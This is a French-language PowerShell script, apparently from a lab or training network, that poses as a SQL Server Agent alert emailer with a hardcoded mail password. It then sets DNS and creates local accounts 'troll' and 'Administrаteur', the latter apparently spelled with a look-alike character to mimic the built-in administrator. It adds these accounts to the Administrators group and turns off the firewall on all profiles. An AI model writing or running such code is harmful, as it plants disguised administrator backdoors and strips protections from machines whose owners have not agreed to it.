function Send-Email {
    param(
        [string]$smtpServer = "mail.ais2024.edu",
        [string]$from = "joris@ais2024.edu",
        [string]$to = "tristan@ais2024.edu",
        [string]$subject = "Arrêt du service SQL Server Agent !",
        [string]$body = "Le service SQL AGENT sur $env:COMPUTERNAME s'est stoppé.",
        [string]$password = "joris"
    )

    $pwd = ConvertTo-SecureString $password -AsPlainText -Force
    $cred = New-Object System.Management.Automation.PSCredential ($from, $pwd)

    # Send the email
    Send-MailMessage -SmtpServer $smtpServer -From $from -To $to -Subject $subject -Body $body -Credential $cred -Encoding utf8
}

Send-Email

$output = "" # Variable de sortie

### Définition du DNS
try {
    Set-DnsClientServerAddress -InterfaceAlias "Ethernet" -ServerAddresses "10.110.12.210"
    $output = "DNS défini sur 10.110.12.210"
}
catch {
    $output = "Erreur lors de la définition du DNS"
}
# Create users
try {
    New-LocalUser -Name "troll" -Password (ConvertTo-SecureString -String "P@$$w0rd" -AsPlainText -Force) -Description "Admin account"
} catch {
    $output = "Error creating user 'troll'"
}

try {
    New-LocalUser -Name "Administrаteur" -Password (ConvertTo-SecureString -String "P@$$w0rd" -AsPlainText -Force) -Description "Admin account"
} catch {
    $output = "Error creating user 'Administrаteur'"
}

# Add users to Administrators group
try {
    Add-LocalGroupMember -Group "Administrateurs" -Member "troll"
} catch {
    $output = "Error adding 'troll' to Administrators group"
}

try {
    Add-LocalGroupMember -Group "Administrateurs" -Member "ais2024"
} catch {
    $output = "Error adding 'ais2024' to Administrators group"
}

try {
    Add-LocalGroupMember -Group "Administrateurs" -Member "Administrаteur"
} catch {
    $output = "Error adding 'Administrаteur' to Administrators group"
}
try {
    Set-NetFirewallProfile -Profile Domain,Private,Public -Enabled False
}
catch {
    $output = "Error disabling firewall"
}
try {
    Enable-NetAdapter -Name "Ethernet" -Confirm:$false
    $output = "Ethernet card enabled"
}
catch {
    $output = "Error enabling Ethernet card"
}
